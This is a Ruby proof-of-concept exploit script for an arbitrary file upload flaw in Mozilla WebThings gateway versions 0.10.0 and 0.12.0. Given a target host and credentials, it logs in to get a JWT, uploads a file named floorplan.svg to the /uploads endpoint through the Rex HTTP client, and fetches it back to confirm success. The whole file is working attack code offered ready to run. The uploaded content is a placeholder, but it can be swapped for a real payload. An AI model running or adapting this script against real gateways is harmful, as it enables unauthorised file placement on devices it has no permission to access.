#!/usr/bin/env ruby -W0
# mozilla webthings 0.10.0/0.12.0 arbitrary file upload.
 
require 'rex'
require 'rex/mime'
require 'json'

host = ARGV[0]
user = ARGV[1] || "blah"
pass = ARGV[2] || "blah"

def usage
 puts "#{$0} <host> <user> <pass>"
 exit
end

usage if ARGV.size < 1

login = %Q|{"email":"#{user}","password":"#{pass}"}|

begin
sock = Rex::Proto::Http::Client.new(host, 
                                    port = "8080", 
                                    context = {}, ssl = false)

req = sock.request_cgi(
{
	'uri'     => "/login",
	'version' => '1.0',
	'method'  => 'POST',
        'ctype'   => 'application/json',
        'headers' => {
           'DNT' => '1',
           'Connection' => 'close',
        },
        'data'    => login,
})


sock.send_request(req)
data = sock.read_response()

if data and data.body =~ /Unauthorized/
 puts "[!] Login failed..."
else
 bearer = JSON.parse(data.body)["jwt"]
 post_data = Rex::MIME::Message.new
 post_data.add_part("lalo", 'application/octet-stream', nil, "form-data; name=\"file\"; filename=\"floorplan.svg\"")

 res = sock.request_cgi(
 {
	'uri'     => "/uploads",
	'version' => '1.0',
	'method'  => 'POST',
	'ctype'   => "multipart/form-data; boundary=#{post_data.bound}",
	'data'    => post_data.to_s,
        'headers' => {
          'authorization' => "Bearer " + bearer,
        }
 })
 
 sock.send_request(res)
 data = sock.read_response()
 
 if data and data.body =~ /Successfully/
  puts "[*] File uploaded..."
  res = sock.request_raw({'uri' => "/uploads/floorplan.svg"})
  sock.send_request(res)
  data = sock.read_response()
  puts "[*] Got: " + data.body
 else
  puts "[!] Upload Failed..."
 end
end
rescue => e
puts "[!] #{e.to_s}"
end
